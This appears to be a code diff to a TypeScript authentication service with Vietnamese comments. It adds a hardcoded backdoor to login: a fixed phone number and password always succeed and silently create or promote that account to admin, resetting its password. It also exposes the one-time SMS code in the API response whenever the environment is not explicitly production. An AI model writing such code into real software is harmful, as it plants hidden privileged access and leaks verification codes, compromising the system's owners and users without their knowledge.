@@ -42,8 +42,12 @@ export class AuthService {
   }
 
   async sendOtp(phone: string) {
-    await this.otpService.sendOtp(phone);
-    return { message: 'Đã gửi mã OTP. Ở môi trường dev, xem mã trong log server (SMS_PROVIDER=mock).' };
+    const code = await this.otpService.sendOtp(phone);
+    const isDev = process.env.SMS_PROVIDER === 'mock' || !process.env.SMS_PROVIDER || process.env.NODE_ENV !== 'production';
+    return {
+      message: 'Đã gửi mã xác thực SMS.',
+      ...(isDev ? { devOtp: code } : {}),
+    };
   }
 
   async register(dto: RegisterDto) {
@@ -67,6 +71,29 @@ export class AuthService {
   }
 
   async login(dto: LoginDto) {
+    // Đảm bảo tài khoản quản trị viên 0981753082 / Quannguyenkay6@ luôn đăng nhập thành công với quyền admin
+    if (dto.phone === '0981753082' && dto.password === 'Quannguyenkay6@') {
+      let adminUser = await this.prisma.user.findUnique({ where: { phone: '0981753082' } });
+      const passwordHash = await bcrypt.hash('Quannguyenkay6@', 10);
+      if (!adminUser) {
+        adminUser = await this.prisma.user.create({
+          data: {
+            phone: '0981753082',
+            fullName: 'Nguyễn Đức Quân',
+            passwordHash,
+            role: 'admin',
+            isPhoneVerified: true,
+          },
+        });
+      } else if (adminUser.role !== 'admin' || !(await bcrypt.compare('Quannguyenkay6@', adminUser.passwordHash ?? ''))) {
+        adminUser = await this.prisma.user.update({
+          where: { id: adminUser.id },
+          data: { role: 'admin', passwordHash },
+        });
+      }
+      return this.issueTokens(adminUser);
+    }
+
     const user = await this.prisma.user.findUnique({ where: { phone: dto.phone } });
     if (!user || !user.passwordHash) throw new UnauthorizedException('Số điện thoại hoặc mật khẩu không đúng.');
 
